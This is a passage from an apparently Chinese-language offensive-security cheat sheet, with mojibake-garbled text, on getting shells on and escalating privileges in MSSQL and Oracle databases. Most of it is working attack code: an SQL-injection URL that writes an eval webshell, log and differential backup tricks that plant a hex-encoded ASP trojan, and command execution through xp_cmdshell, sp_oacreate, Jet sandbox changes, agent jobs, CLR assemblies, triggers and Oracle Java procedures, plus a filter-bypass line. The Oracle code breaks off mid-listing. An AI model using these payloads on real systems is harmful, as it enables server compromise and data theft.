<h3 id="xp-cmdshell-Get-Shell"><a href="#xp-cmdshell-Get-Shell" class="headerlink" title="xp_cmdshell Get Shell"></a>xp_cmdshell Get Shell</h3><p>ä½¿ç”¨cmdå†™webshellæ—¶ä¼šå‡ºç°ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰çš„é—®é¢˜ï¼Œè¿˜æ˜¯ç”¨<code>certutil</code>ä¹‹ç±»çš„æ¥ä¸‹è½½åˆ°webç›®å½•æ¯”è¾ƒå¥½ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.188/1.aspx?id=1;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27; ; </span><br></pre></td></tr></table></figure>



<br/>



<h3 id="æ—¥å¿—å¤‡ä»½-Get-Shell-æ¨è"><a href="#æ—¥å¿—å¤‡ä»½-Get-Shell-æ¨è" class="headerlink" title="æ—¥å¿—å¤‡ä»½ Get Shell[æ¨è]"></a>æ—¥å¿—å¤‡ä»½ Get Shell[æ¨è]</h3><blockquote>
<p>åˆ©ç”¨æ¡ä»¶:</p>
</blockquote>
<ul>
<li>çŸ¥é“ç½‘ç«™çš„<code>ç»å¯¹è·¯å¾„</code>ï¼Œä¸”è·¯å¾„å¯<code>å†™å…¥</code></li>
<li><code>ç«™åº“ä¸åˆ†ç¦»</code></li>
<li>æ•°æ®åº“å¿…é¡»è¢«<code>å¤‡ä»½è¿‡ä¸€æ¬¡</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-- ä¿®æ”¹æ•°æ®åº“æ¢å¤æ¨¡å¼ä¸ºå®Œæ•´æ¨¡å¼</span><br><span class="line">alter database åº“å set RECOVERY FULL </span><br><span class="line">-- å¦‚æœå­˜åœ¨ cmd è¡¨å°±åˆ é™¤</span><br><span class="line">IF EXISTS(select table_name from information_schema.tables where table_name&#x3D;&#39;cmd&#39;)drop table cmd</span><br><span class="line">-- åˆ›å»ºä¸€ä¸ª cmd è¡¨ï¼Œä»…ä»…å­˜åœ¨ä¸€ä¸ªç±»å‹ä¸ºimageçš„åˆ—a</span><br><span class="line">create table cmd (a image) </span><br><span class="line">-- å¤‡ä»½æ“ä½œæ—¥å¿—åˆ°æŒ‡å®šè·¯å¾„</span><br><span class="line">backup log åº“å to disk &#x3D; &#39;c:\www\&#39; with init </span><br><span class="line">-- æ’å…¥ä¸€å¥è¯åˆ°cmdè¡¨ä¸­çš„åˆ—a</span><br><span class="line">insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) </span><br><span class="line">-- å¤‡ä»½æ“ä½œæ—¥å¿—åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œæœ¨é©¬æ–‡ä»¶</span><br><span class="line">backup log æ•°æ®åº“å to disk &#x3D; &#39;c:\www\iofo.asp&#39;</span><br><span class="line">-- åˆ é™¤cmdè¡¨</span><br><span class="line">drop table cmd</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<br/>



<h3 id="å·®å¼‚å¤‡ä»½-GetShell"><a href="#å·®å¼‚å¤‡ä»½-GetShell" class="headerlink" title="å·®å¼‚å¤‡ä»½ GetShell"></a>å·®å¼‚å¤‡ä»½ GetShell</h3><blockquote>
<p>åˆ©ç”¨æ¡ä»¶</p>
</blockquote>
<ul>
<li>çŸ¥é“ç½‘ç«™çš„<code>ç»å¯¹è·¯å¾„</code>ï¼Œä¸”è·¯å¾„å¯<code>å†™å…¥</code></li>
<li>å½“å‰ç”¨æˆ·å­˜åœ¨saæƒé™ã€dboæƒé™(å…·æœ‰å¤‡ä»½æƒé™)</li>
<li><code>ç«™åº“ä¸åˆ†ç¦»</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- å…ˆæ‰‹åŠ¨å¤‡ä»½ä¸€æ¬¡ï¼Œæ•°æ®åº“å¤ªå¤§å°±è¦è€å¿ƒç­‰å¾…</span><br><span class="line">;backup database åº“å to disk &#x3D; &#39;c:\bak.bak&#39;; </span><br><span class="line">-- å»ºè¡¨ï¼Œå»ºå­—æ®µ</span><br><span class="line">;create table æ•°æ®åº“å..è¡¨å(a image) </span><br><span class="line">-- æ’å…¥ä¸€å¥è¯åˆ°è¡¨åä¸­çš„åˆ—a</span><br><span class="line">;insert into æ•°æ®åº“å..è¡¨å(a) value (0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line">-- &#x2F;&#x2F;è¿›è¡Œå·®å¼‚å¤‡ä»½</span><br><span class="line">;backup database åº“å to disk &#x3D; &#39;c:\shell.asp&#39; with differential,format ;</span><br></pre></td></tr></table></figure>

<br/>

<hr>
<br/>

<h2 id="MSSQL-ææƒ"><a href="#MSSQL-ææƒ" class="headerlink" title="MSSQL ææƒ"></a>MSSQL ææƒ</h2><br/>



<h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><blockquote>
<p>åœ¨2005ä¸­xp_cmdshellçš„æƒé™æ˜¯systemï¼Œ2008ä¸­åˆ™æ˜¯networkã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ xp_cmdshell</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹èƒ½å¦ä½¿ç”¨ xp_cmdshellï¼Œä»MSSQL2005ç‰ˆæœ¬ä¹‹åé»˜è®¤å…³é—­</span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; and name &#x3D; &#39;xp_cmdshell&#39;</span><br><span class="line"></span><br><span class="line"># å…³é—­ xp_cmdshell</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 0;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"># å¼€å¯ xp_cmdshell</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œ xp_cmdshell</span><br><span class="line">exec master..xp_cmdshell &#39;cmd &#x2F;c whoami&#39;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>åœ¨åˆ©ç”¨ä¸­é€šå¸¸é‡‡ç”¨(certutilã€vbsã€bitsadminã€powershellä¸‹è½½payloadä¸Šçº¿æˆ–è€…åå¼¹shellè¿›è¡Œæ“ä½œã€‚)</p>
</blockquote>
<br/>



<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><blockquote>
<p>å¦‚æœxp_cmdshellè¢«åˆ é™¤çš„è¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨sp_oacreate</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-- æ¢å¤sp_oacreate</span><br><span class="line"></span><br><span class="line">-- å¯ç”¨é«˜çº§é€‰é¡¹</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;  </span><br><span class="line">-- åº”ç”¨é…ç½®æ›´æ”¹</span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">-- å¯ç”¨OLEè‡ªåŠ¨åŒ–è¿‡ç¨‹ </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1; </span><br><span class="line">-- å†æ¬¡é…ç½®æ›´æ”¹</span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">-- ç¦ç”¨æ˜¾ç¤ºé«˜çº§é€‰é¡¹</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 0;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¼€å§‹è°ƒç”¨cmd æ‰§è¡Œå‘½ä»¤</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ç¬¬ä¸€ç§æ–¹å¼</span><br><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#39;Shell.Application&#39;, @o out</span><br><span class="line">exec sp_oamethod @o, &#39;ShellExecute&#39;,null, &#39;cmd.exe&#39;,&#39;cmd &#x2F;c whoami &gt;e:\test.txt&#39;,&#39;c:\windows\system32&#39;,&#39;&#39;,&#39;1&#39;;</span><br><span class="line"></span><br><span class="line"># ç¬¬äºŒç§æ–¹å¼</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt; c:\\1.txt&#39;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨sp_oacreateè¯»å†™æ–‡ä»¶</p>
</blockquote>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @o <span class="keyword">int</span>, @f <span class="keyword">int</span>, @t <span class="keyword">int</span>, @ret <span class="keyword">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>, @o out</span><br><span class="line"><span class="keyword">exec</span> sp_oamethod @o, <span class="string">&#x27;createtextfile&#x27;</span>, @f out, <span class="string">&#x27;e:\tmp1.txt&#x27;</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;tes1t&#x27;</span></span><br></pre></td></tr></table></figure>



<br/>



<h3 id="æ²™ç›’ææƒ"><a href="#æ²™ç›’ææƒ" class="headerlink" title="æ²™ç›’ææƒ"></a>æ²™ç›’ææƒ</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li>æ‹¥æœ‰<code>DBA</code>æƒé™</li>
<li><code>SqlServer</code>æœåŠ¡ä¸º<code>system</code></li>
<li>æœåŠ¡å™¨æ‹¥æœ‰<code>jet.oledb.4.0</code>é©±åŠ¨</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- è®¾ç½®æ³¨å†Œè¡¨ä¸­çš„SandBoxModeçš„å€¼è®¾ç½®ä¸º0</span><br><span class="line">exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,0;</span><br><span class="line">-- è¯»å–æ³¨å†Œè¡¨ä¸­çš„SandBoxModeçš„å€¼</span><br><span class="line">exec master.dbo.xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;, &#39;SandBoxMode&#39;;</span><br><span class="line">-- è°ƒç”¨Accessé‡Œçš„æ‰§è¡Œå‘½ä»¤æ–¹æ³•ï¼Œä»¥systemæƒé™æ‰§è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œwhoami</span><br><span class="line">Select * From OpenRowSet(&#39;Microsoft.Jet.OLEDB.4.0&#39;,&#39;;Databasec:\windows\system32\ias\ias.mdb&#39;,&#39;select shell( whoami )&#39;);</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="Ole-Automation-Proceduresææƒ"><a href="#Ole-Automation-Proceduresææƒ" class="headerlink" title="Ole Automation Proceduresææƒ"></a>Ole Automation Proceduresææƒ</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li>æ‹¥æœ‰DBAæƒé™</li>
</ul>
<blockquote>
<p>å¼€å¯Ole automation procedures</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;show advanced options&#39;, 0;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä½¿ç”¨<code>script.shell</code>ç»„ä»¶æ‰§è¡Œ</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @luan int,@exec int,@text int,@str varchar(8000)</span><br><span class="line">exec sp_oacreate &#39;wscript.shell&#39;,@luan output</span><br><span class="line">exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe &#x2F;c whoami&#39;</span><br><span class="line">exec sp_oamethod @exec, &#39;StdOut&#39;, @text out</span><br><span class="line">exec sp_oamethod @text, &#39;readall&#39;, @str out</span><br><span class="line">select @str;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä½¿ç”¨<code>com</code>ç»„ä»¶æ‰§è¡Œ</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">declare @luan int,@exec int,@text int,@str varchar(8000)</span><br><span class="line">exec sp_oacreate &#39;&#123;72C24DD5-D70A-438B-8A42-98424B88AFB8&#125;&#39;,@luan output</span><br><span class="line">exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe &#x2F;c whoami&#39;</span><br><span class="line">exec sp_oamethod @exec, &#39;StdOut&#39;, @text out</span><br><span class="line">exec sp_oamethod @text, &#39;readall&#39;, @str out</span><br><span class="line">select @str;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="JobAgentææƒ"><a href="#JobAgentææƒ" class="headerlink" title="JobAgentææƒ"></a>JobAgentææƒ</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li>æ‹¥æœ‰DBAæƒé™</li>
<li>éœ€è¦<code>sqlserver</code>ä»£ç†<code>sqlagent</code>å¼€å¯</li>
</ul>
<blockquote>
<p>å¼€å¯<code>sqlagent</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_servicecontrol &#39;start&#39;,&#39;SQLSERVERAGENT&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>åˆ©ç”¨ä»»åŠ¡è®¡åˆ’å‘½ä»¤æ‰§è¡Œï¼ˆæ— å›æ˜¾ï¼‰</li>
</ol>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">EXEC dbo.sp_add_job @job_name &#x3D; N&#39;testjob&#39;</span><br><span class="line">EXEC sp_add_jobstep @job_name &#x3D; N&#39;testjob&#39;, @step_name &#x3D; N&#39;testjob&#39;, @subsystem &#x3D; N&#39;CMDEXEC&#39;, @command &#x3D; N&#39;whoami&#39;, @retry_attempts &#x3D; 1, @retry_interval &#x3D; 5</span><br><span class="line">EXEC dbo.sp_add_jobserver @job_name &#x3D; N&#39;testjob&#39;</span><br><span class="line">EXEC dbo.sp_start_job N&#39;testjob&#39;;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="CLRææƒ"><a href="#CLRææƒ" class="headerlink" title="CLRææƒ"></a>CLRææƒ</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li>æ‹¥æœ‰DBAæƒé™</li>
<li>å¼€å¯CLR</li>
</ul>
<blockquote>
<p>å¼€å¯CLR</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,&#39;1&#39;;reconfigure;exec sp_configure &#39;clr enabled&#39;,&#39;1&#39;;reconfigure;exec sp_configure &#39;show advanced options&#39;,&#39;1&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¯¼å…¥CLRæ’ä»¶</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/SafeGroceryStore/MDUT/blob/main/MDAT-DEV/src/main/Plugins/Mssql/clr.txt">16è¿›åˆ¶çš„dll</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [MDATKit]</span><br><span class="line">AUTHORIZATION [dbo]</span><br><span class="line">FROM 0x16è¿›åˆ¶çš„dll</span><br><span class="line">WITH PERMISSION_SET &#x3D; UNSAFE;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åˆ›å»ºCLRå‡½æ•°</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[kitmain]</span><br><span class="line">@method NVARCHAR (MAX) , @arguments NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [MDATKit].[StoredProcedures].[kitmain]</span><br></pre></td></tr></table></figure>

<blockquote>
<p> kitmainå‡½æ•°å‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec kitmain &#39;cmdexec&#39;,N&#39;whoami&#39;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="è§¦å‘å™¨ææƒ"><a href="#è§¦å‘å™¨ææƒ" class="headerlink" title="è§¦å‘å™¨ææƒ"></a>è§¦å‘å™¨ææƒ</h3><blockquote>
<p>SqlServer åŒ…æ‹¬ä¸‰ç§å¸¸è§„ç±»å‹çš„è§¦å‘å™¨ï¼šDML è§¦å‘å™¨ã€DDL è§¦å‘å™¨å’Œç™»å½•è§¦å‘å™¨.</p>
<p>è¿™é‡Œåªè¯´ç™»é™†è§¦å‘å™¨ï¼Œä¸ SQL Server å®ä¾‹å»ºç«‹ç”¨æˆ·ä¼šè¯æ—¶å°†å¼•å‘æ­¤äº‹ä»¶ã€‚ç™»å½•è§¦å‘å™¨å°†åœ¨ç™»å½•çš„èº«ä»½éªŒè¯é˜¶æ®µå®Œæˆä¹‹åä¸”ç”¨æˆ·ä¼šè¯å®é™…å»ºç«‹ä¹‹å‰æ¿€å‘ï¼Œå¦‚æœèº«ä»½éªŒè¯å¤±è´¥åˆ™ä¸ä¼šè§¦å‘ã€‚</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-- è®¾ç½®ä¸€ä¸ªè§¦å‘å™¨ ffffffff0x,å½“<span class="built_in"> user </span>è¡¨æ›´æ–°æ—¶è§¦å‘å‘½ä»¤ (user è¡¨ å¿…é¡»å­˜åœ¨ï¼Œä¸” å®¹æ˜“ å¡æ­» å› ä¸ºè¿™ä¸ªcalcåœ¨è¿è¡Œ æŸ¥è¯¢å°±ä¸ä¼šåœæ­¢)</span><br><span class="line"><span class="builtin-name">set</span> ANSI_NULLS on</span><br><span class="line">go</span><br><span class="line"><span class="builtin-name">set</span> QUOTED_IDENTIFIER on</span><br><span class="line">go</span><br><span class="line">create trigger [ffffffff0x]</span><br><span class="line">on [user]</span><br><span class="line">AFTER UPDATE as</span><br><span class="line">begin</span><br><span class="line">    execute master<span class="built_in">..</span>xp_cmdshell <span class="string">&#x27;cmd.exe /c calc.exe&#x27;</span></span><br><span class="line">end</span><br><span class="line">go</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="built_in"> user </span>è¡¨ update æ›´æ–°æ—¶ï¼Œè‡ªåŠ¨è§¦å‘</span><br><span class="line">UPDATE<span class="built_in"> user </span><span class="builtin-name">SET</span> id = <span class="string">&#x27;22&#x27;</span> WHERE nickname = <span class="string">&#x27;f0x&#x27;</span></span><br></pre></td></tr></table></figure>



<br/>

<hr>
<br/>

<h2 id="Other-1"><a href="#Other-1" class="headerlink" title="Other"></a>Other</h2><br/>



<h3 id="å¯¼å‡ºæ•°æ®åº“-1"><a href="#å¯¼å‡ºæ•°æ®åº“-1" class="headerlink" title="å¯¼å‡ºæ•°æ®åº“"></a>å¯¼å‡ºæ•°æ®åº“</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -S &quot;CLOUD-RV65SV-G0&quot; -U &quot;sa&quot; -P &quot;Password&quot; -Q &quot;BACKUP DATABASE [ng-<span class="built_in">net</span>] TO DISK=&#x27;C:\Backup\ng.bak&#x27;&quot;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="è¿æ¥IP-1"><a href="#è¿æ¥IP-1" class="headerlink" title="è¿æ¥IP"></a>è¿æ¥IP</h3><blockquote>
<p>è¿”å›æ¯ä¸ªè¿æ¥åˆ°æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ•°æ®åº“åç§°ã€è¿æ¥æ•°ã€ç™»å½•åã€åº”ç”¨ç¨‹åºåç§°ã€ä¸»æœºåå’Œ IP åœ°å€ã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT DB_NAME(dbid) AS DBName, COUNT(dbid) AS NumberOfConnections,</span><br><span class="line">    loginame AS LoginName, program_name AS ApplicationName,</span><br><span class="line">    hostname AS HostName, net_library AS NetworkLibrary,</span><br><span class="line">    client_net_address AS IPAddress, nt_username AS NTUserName,</span><br><span class="line">    login_time AS LoginTime</span><br><span class="line">FROM sys.sysprocesses</span><br><span class="line">JOIN sys.dm_exec_connections ON sys.sysprocesses.spid &#x3D; sys.dm_exec_connections.session_id</span><br><span class="line">WHERE dbid &gt; 0</span><br><span class="line">GROUP BY dbid, loginame, program_name, hostname, net_library, client_net_address, nt_username, login_time</span><br><span class="line">ORDER BY DBName, NumberOfConnections DESC;</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">DECLARE</span> <span class="variable">@x</span> AS VARCHAR(<span class="number">100</span>)=<span class="string">&#x27;xp_cmdshell&#x27;</span>; <span class="attribute">EXEC</span> <span class="variable">@x</span> <span class="string">&#x27;ping x.x.x.x&#x27;</span></span><br></pre></td></tr></table></figure>



<br/>

<hr>
<hr>
<br/>



<h1 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a>ORACLE</h1><br/>



<h2 id="Oracle-Getshell"><a href="#Oracle-Getshell" class="headerlink" title="Oracle Getshell"></a>Oracle Getshell</h2><br/>



<h3 id="JAVAå‡½æ•°ææƒ"><a href="#JAVAå‡½æ•°ææƒ" class="headerlink" title="JAVAå‡½æ•°ææƒ"></a>JAVAå‡½æ•°ææƒ</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li>æ‹¥æœ‰<code>DBA</code>æƒé™</li>
</ul>
<blockquote>
<p>ä½¿ç”¨<code>sqlplus</code>è¿æ¥</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlplus system/system@<span class="number">192</span>.<span class="number">168</span>.<span class="number">117</span>.<span class="number">66</span>:<span class="number">1521</span>/orcl</span><br></pre></td></tr></table></figure>

<blockquote>
<p>èµ‹äºˆæƒé™</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">begin dbms_java.grant_permission( &#39;PUBLIC&#39;, &#39;SYS:java.io.FilePermission&#39;, &#39;&lt;&lt;ALL FILES&gt;&gt;&#39;, &#39;read,write,execute,delete&#39; );end;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åˆ›å»ºJavaä»£ç </p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">create or replace and compile java source named exe_linux as</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">list_cmd</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">    Runtime runtime=Runtime.getRuntime();</span><br><span class="line">  StringBuffer enco = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">  enco.append(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">  Process proc =runtime.exec(str);</span><br><span class="line">  InputStream inp_suc=proc.getInputStream();</span><br><span class="line">  InputStream inp_err=proc.getErrorStream();</span><br><span class="line">  BufferedReader bfr_err = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inp_err,enco.toString()));</span><br><span class="line">  BufferedReader bfr_suc = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inp_suc,enco.toString()));</span><br><span class="line">    String strLine;</span><br><span class="line">      <span class="keyword">while</span>( (strLine=(bfr_suc.readLine())) != <span class="keyword">null</span>)&#123;</span><br><span class="line">      System.out.println(strLine);</span><br><span class="line">          &#125;</span><br><span class="line">  <span class="keyword">while</span>( (strLine=(bfr_err.readLine())) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    System.out.println(strLine);</span><br><span class="line">    